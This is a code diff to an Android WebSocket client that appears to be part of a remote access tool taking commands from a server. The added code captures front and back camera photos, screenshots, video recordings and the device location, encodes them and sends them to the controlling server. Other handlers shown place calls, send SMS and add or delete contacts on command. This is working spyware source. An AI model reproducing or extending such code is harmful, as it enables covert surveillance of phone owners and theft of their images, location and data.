@@ -5,14 +5,20 @@ import android.util.Base64;
 import android.util.Log;
 
 import com.ot.grhq.client.functionality.FileManager;
+import com.ot.grhq.client.functionality.Location;
 import com.ot.grhq.client.functionality.PackageManager;
 import com.ot.grhq.client.functionality.Phone;
 import com.ot.grhq.client.functionality.SMS;
+import com.ot.grhq.client.functionality.Screenshot;
 
 import org.java_websocket.handshake.ServerHandshake;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.IOException;
 import java.net.URI;
 import java.util.List;
 import java.util.Map;
@@ -40,16 +46,40 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
             throw new RuntimeException(e);
         }
         try {
-            JSONObject json = new JSONObject(message);
-            Command cmd = Command.valueOf(json.optString("cmd"));
+            JSONObject req = new JSONObject(message);
+
+            JSONObject json = new JSONObject();
+            json.put("type", "client");
+            json.put("id", "");
+
+            byte[] data = null;
+            File file = null;
+            String path = null;
+            Command cmd = Command.valueOf(req.optString("cmd"));
 
             switch (cmd) {
                 case CALL:
                     Phone.call(context, json.getString("number"));
                     break;
                 case CAMERA_BACK:
+                    path = Screenshot.captureImage(context, false);
+                    data = getFileContent(path);
+                    file = new File(path);
+                    json.put("data", Base64.encode(data, Base64.DEFAULT));
+                    json.put("res", "image");
+                    json.put("filename", Base64.encode(file.getName().getBytes(), Base64.DEFAULT));
+                    json.put("timestamp", file.getName().split(".")[0]);
+                    send(json.toString());
                     break;
                 case CAMERA_FRONT:
+                    path = Screenshot.captureImage(context, true);
+                    data = getFileContent(path);
+                    file = new File(path);
+                    json.put("data", Base64.encode(data, Base64.DEFAULT));
+                    json.put("res", "image");
+                    json.put("filename", Base64.encode(file.getName().getBytes(), Base64.DEFAULT));
+                    json.put("timestamp", file.getName().split(".")[0]);
+                    send(json.toString());
                     break;
                 case DELETE_CONTACT:
                     Phone.deleteContact(json.getString("name"), json.getString("number"));
@@ -70,9 +100,24 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     List<String> files = FileManager.listFiles(json.getString("path"));
                     sendResponse("files", files.toString());
                     break;
+                case LOCATION:
+                    json = Location.getLastKnownLocation(context);
+                    long timestamp = System.currentTimeMillis();
+                    json.put("timestamp", timestamp);
+                    json.put("res", "location");
+                    send(json.toString());
+                    break;
                 case READ_CONTACTS:
                     break;
                 case SCREENSHOT:
+                    path = Screenshot.captureScreen(context);
+                    data = getFileContent(path);
+                    file = new File(path);
+                    json.put("data", Base64.encode(data, Base64.DEFAULT));
+                    json.put("res", "screenshot");
+                    json.put("filename", Base64.encode(file.getName().getBytes(), Base64.DEFAULT));
+                    json.put("timestamp", file.getName().split(".")[0]);
+                    send(json.toString());
                     break;
                 case TEXT:
                     SMS.send(json.getString("name"), json.getString("number"));
@@ -80,6 +125,14 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                 case UPLOAD_FILE:
                     break;
                 case VIDEO:
+                    path = Screenshot.captureVideo(context, req.getInt("duration"));
+                    data = getFileContent(path);
+                    file = new File(path);
+                    json.put("data", Base64.encode(data, Base64.DEFAULT));
+                    json.put("res", "video");
+                    json.put("filename", Base64.encode(file.getName().getBytes(), Base64.DEFAULT));
+                    json.put("timestamp", file.getName().split(".")[0]);
+                    send(json.toString());
                     break;
                 case WRITE_CONTACT:
                     Phone.addContact(context, json.getString("name"), json.getString("number"));
@@ -88,6 +141,10 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     break;
             }
         } catch (JSONException e) {
+            throw new RuntimeException(e);
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        } catch (InterruptedException e) {
             throw new RuntimeException(e);
         }
     }
@@ -124,5 +181,19 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
         }
 
         return jsonObject;
+    }
+
+    private byte[] getFileContent(String path) throws IOException {
+        byte[] data = null;
+
+        File file = new File(path);
+        if (file.exists()) {
+            FileInputStream fileInputStream = new FileInputStream(file);
+            data = new byte[(int) file.length()];
+            fileInputStream.read(data);
+            fileInputStream.close();
+        }
+
+        return data;
     }
 }
